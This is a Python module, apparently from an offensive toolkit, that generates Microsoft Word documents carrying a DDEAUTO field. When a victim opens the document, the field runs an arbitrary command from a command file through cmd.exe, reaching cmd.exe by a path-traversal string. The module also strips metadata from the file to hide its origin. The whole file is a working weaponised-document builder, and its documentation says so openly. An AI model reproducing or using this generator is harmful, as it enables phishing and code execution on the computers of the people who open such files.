#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
from common.utils import MSTypes
if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport

import logging
from modules.word_gen import WordGenerator


class WordDDE(WordGenerator):
    """ 
    Module used to generate MS Word file with DDE object attack
    Inspired by: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
    """
         
    
    def run(self):
        logging.info(" [+] Generating MS Word with DDE document...")
        
        # Read command file
        commandFile =self.getCMDFile()    
        if commandFile == "":
            logging.error("   [!] Could not find cmd input!")
            return

        logging.info("   [-] Open document...")
        # open up an instance of Word with the win32com driver
        word = win32com.client.Dispatch("Word.Application")
        # do the operation in background without actually opening Excel
        word.Visible = False
        document = word.Documents.Open(self.outputFilePath)

        logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
        with open (commandFile, "r") as f:
            command=f.read()
        
        ddeCmd = r'"\"c:\\Program Files\\Microsoft Office\\MSWORD\\..\\..\\..\\windows\\system32\\cmd.exe\" /c %s" "."' % command.rstrip()
        wdFieldDDEAuto=46
        document.Fields.Add(Range=word.Selection.Range,Type=wdFieldDDEAuto, Text=ddeCmd, PreserveFormatting=False)
        
        # save the document and close
        word.DisplayAlerts=False
        # Remove Informations
        logging.info("   [-] Remove hidden data and personal info...")
        wdRDIAll=99
        document.RemoveDocumentInformation(wdRDIAll)
        logging.info("   [-] Save Document...")
        document.Save()
        document.Close()
        word.Application.Quit()
        # garbage collection
        del word
        
        logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
         
        
        